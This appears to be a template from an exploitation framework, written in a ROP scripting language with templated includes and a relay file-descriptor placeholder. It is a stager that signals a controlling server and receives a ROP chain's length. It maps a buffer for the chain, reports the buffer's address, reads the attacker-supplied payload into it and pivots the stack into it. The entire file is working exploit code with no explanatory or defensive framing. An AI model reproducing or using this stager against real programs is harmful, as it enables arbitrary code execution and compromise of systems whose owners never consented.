{% include "gadgets.pro" %}
{% include "glibc.pro" %}

// tell the server to start
write({{RELAY_FD}}, "START", 5);

// read length of rop
var roplen;
read({{RELAY_FD}}, &roplen, 8);
// dprintf({{RELAY_FD}}, "rop length = %x\n", roplen);

// setup memory for rop
var pivot;
var ropbuf;
mmap(0, roplen, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
store_rdx_rax(&ropbuf, undefined);
// dprintf({{RELAY_FD}}, "rop buffer = %p\n", ropbuf);
write({{RELAY_FD}}, &ropbuf, 8);

// read payload of rop
read({{RELAY_FD}}, ropbuf, roplen);

nop();
// stack pivoting
store_rdx_rax(&pivot, set_rsp);
inline(set_rsp, &pivot); // tricky: pivot twice
